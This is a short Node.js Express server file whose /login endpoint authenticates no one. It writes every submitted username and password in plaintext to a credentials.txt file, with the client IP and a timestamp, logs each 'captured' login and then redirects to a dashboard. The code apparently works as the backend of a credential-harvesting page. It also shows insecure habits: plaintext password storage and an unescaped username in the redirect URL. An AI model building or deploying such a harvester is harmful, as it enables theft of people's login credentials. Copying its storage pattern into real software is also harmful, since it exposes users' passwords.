const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files (HTML, CSS, JS)
app.use(express.static('public'));

// Create data directory if it doesn't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

// Login endpoint
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const timestamp = new Date().toISOString();

    // Get IP address (handles proxies and forwarded IPs)
    const ip = req.headers['x-forwarded-for'] ||
        req.headers['x-real-ip'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket?.remoteAddress ||
        'Unknown';

    // Clean up IP (remove IPv6 prefix if present)
    const cleanIp = ip.split(',')[0].trim().replace('::ffff:', '');

    // Format: username=USER;password=PASS;ip=IP_ADDRESS;timestamp=TIME
    const data = `username=${username};password=${password};ip=${cleanIp};timestamp=${timestamp}\n`;

    // Append to credentials.txt
    const filePath = path.join(dataDir, 'credentials.txt');
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).send('Error saving credentials');
        }

        console.log(`Login captured: ${username} from IP ${cleanIp}`);

        // Redirect to dashboard with username
        res.redirect(`/dashboard.html?username=${username}`);
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Credentials will be saved to: ${path.join(dataDir, 'credentials.txt')}`);
});